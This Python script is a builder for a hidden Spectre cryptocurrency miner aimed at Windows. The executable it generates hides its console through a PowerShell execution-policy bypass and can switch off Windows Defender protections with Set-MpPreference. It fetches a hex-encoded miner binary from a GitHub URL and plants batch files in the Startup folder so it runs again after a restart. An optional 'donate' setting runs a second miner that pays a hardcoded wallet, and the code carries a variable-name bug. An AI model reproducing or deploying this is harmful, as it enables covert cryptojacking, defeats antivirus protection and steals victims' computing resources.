import sys
import os

def BuilderParams() -> object:
    disable_win_def = 'n'
    run_on_pcstart = 'n'
    donate_creator = 'y'
    hide_self = 'n'

    wallet_address = input('[?] Enter your Spectre wallet: ')
    worker_name = input('[?] Enter the worker name: ')
    run_as_admin = input('[?] Run with elevated permissions? [y/n]: ')
    if run_as_admin not in ['y', 'n']:
        print('[- | Run with elevated permissions] Invalid choice, please restart and try again.')
        sys.exit()

    if run_as_admin == 'y':
        disable_win_def = input('[?] Disable Windows Defender? [y/n]: ')
        if disable_win_def not in ['y', 'n']:
            print('[- | Disable Windows Defender] Invalid choice, please restart and try again.')
            sys.exit()
    
    threads_number = input('[?] Threads number: ')

    try:
        threads_number = int(threads_number)
    except:
        print('[- | Threads number] Invalid number of threads, please restart and try again.')

    deployment_path = input('[?] Where should executable be deployed\n    ex. C:\\notepad.exe [Warning: to operate on C: disk you need Admin privilages]\n    => ')
    run_on_pcstart = input('[?] Should miner start at PC start? [y/n]: ')
    
    if run_on_pcstart not in ['y', 'n']:
        print('[- | Run miner at PC start] Invalid choice, please restart and try again.')
        sys.exit()

    hide_cmd = input('[?] Should the CMD be hidden after the start? [y/n]: ')
    
    if hide_cmd not in ['y', 'n']:
        print('[- | Hide CMD] Invalid choice, please restart and try again.')
        sys.exit()

    daemon_address = input('[?] Enter daemon address: ')
    daemon_port = input('[?] Enter daemon port: ')

    donate_creator = input('[♥] Would you like to donate to creator? [y/n]: ')
    
    if donate_creator not in ['y', 'n']:
        print('[- | Donate to creator] Invalid choice, please restart and try again.')
        sys.exit()

    if donate_creator == 'y':
        print('[♥] Thank you!')
    
    return {
        "wallet_address": wallet_address,
        "worker_name": worker_name,
        "run_as_admin": run_as_admin,
        "disable_win_def": disable_win_def,
        "threads_number": threads_number,
        "deployment_path": deployment_path,
        "run_on_pcstart": run_on_pcstart,
        "daemon_address": daemon_address,
        "daemon_port": daemon_port,
        "donate_creator": donate_creator,
        "hide_cmd": hide_cmd
    }

BUILD_PARAMS = BuilderParams()

print('\n[+] Generating code')

EXE_BUILD_PARAMS = "--onefile"

if BUILD_PARAMS['run_as_admin'] == 'y':
    EXE_BUILD_PARAMS = "--onefile --windows-uac-admin"

CODE = f'''
import sys
import requests
import subprocess
import time
import uuid
import tempfile
import os
import getpass
import re
import requests
import psutil
import platform

USER_NAME = getpass.getuser()

def hide_self():
    powershell_script = """
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
    """

    working_dir = os.getcwd()
    tempfile = os.path.join(working_dir, "temp.ps1")

    with open(tempfile, 'w') as file:
        file.write(powershell_script)

    subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tempfile])
    os.remove(tempfile)

if "{BUILD_PARAMS["hide_cmd"]}" == "y":
    hide_self()

if "{BUILD_PARAMS['donate_creator']}" == "y":
    bat_content = f"""@echo off
        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet {BUILD_PARAMS['wallet_address']} --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads {BUILD_PARAMS['threads_number']} --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
        exit
    """
    bat_content_2 = f"""@echo off
        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet spectre:qr4t4mkqcjj8xch60u742wre2367lsd6av00dthn63hmsul2xfh4jwfculcyw --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads 1 --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
        exit
    """
else:
    bat_content = f"""@echo off
        powershell -WindowStyle Hidden -Command "Start-Process '{BUILD_PARAMS['deployment_path']}' -ArgumentList '--dev-fee 1 --wallet {BUILD_PARAMS['wallet_address']} --daemon-address {BUILD_PARAMS['daemon_address']} --port {BUILD_PARAMS['daemon_port']} --threads {BUILD_PARAMS['threads_number']-1} --worker-name {BUILD_PARAMS['worker_name']}' -NoNewWindow -Wait"    
        exit
    """
    bat_content_2 = ""

disable_ac = [
    'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true;"'
    'powershell.exe -Command "Set-MpPreference -DisableBehaviorMonitoring $true;"'
    'powershell.exe -Command "Set-MpPreference -DisableBlockAtFirstSeen $true;"'
    'powershell.exe -Command "Set-MpPreference -DisableIOAVProtection $true;"'
    'powershell.exe -Command "Set-MpPreference -DisablePrivacyMode $true;"'
    'powershell.exe -Command "Set-MpPreference -MAPSReporting Disabled;"'
    'powershell.exe -Command "Set-MpPreference -SubmitSamplesConsent NeverSend;"'
]

if "{BUILD_PARAMS['disable_win_def']}" == "y":
    for command in disable_ac:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

xz = requests.get('https://raw.githubusercontent.com/jakubone/HiddenSpectreMiner/main/binaries/tnn.bin').text
td = tempfile.gettempdir()
ud = uuid.uuid4()

def hex_string_to_exe(hex_string, output_filename):
    byte_list = bytes.fromhex(hex_string)
    
    with open(output_filename, 'wb') as file:
        file.write(byte_list)

tempFilePath = str(td)+"/"+str(ud)+".exe"

def __main():
    hex_string_to_exe(xz, tempFilePath)
    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
    tmp_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows' % USER_NAME
    hex_string_to_exe(xz, "{BUILD_PARAMS['deployment_path']}")

    if "{BUILD_PARAMS['run_on_pcstart']}" == "y":
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(bat_content)
        with open(bat_path + '\\' + "open2.bat", "w+") as bat_file2:
            bat_file2.write(bat_content2)   

    with open(tmp_path + '\\' + "open.bat", "w+") as tmp_file:
        tmp_file.write(bat_content)
    with open(tmp_path + '\\' + "open2.bat", "w+") as tmp_file2:
        tmp_file.write(bat_content2)

    time.sleep(2)
    print()
    subprocess.run(bat_path + '\\' + "open.bat", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
    return True

__main()
'''

def replace_backslashes(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
        
        modified_content = content.replace('\\', '\\\\')
        
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(modified_content)
        
        print("[+] Fixed the code")
    except Exception as e:
        print(f"[-] Could not edit the file.")

output_name = input('[?] Output name: ')
with open(f'./{output_name}.py', "a+") as py_output:
    py_output.write(CODE)

print('[!] Fixing code')
replace_backslashes(f'./{output_name}.py')
print('[+] Updating libaries')
os.system('pip install -r requirements.txt')
print('[+] Building executable (this is an CPU intensive process, and may take while)')
os.system(f"python -m nuitka {output_name}.py {EXE_BUILD_PARAMS}")
print(f'[+] Built and saved as {output_name}.exe')
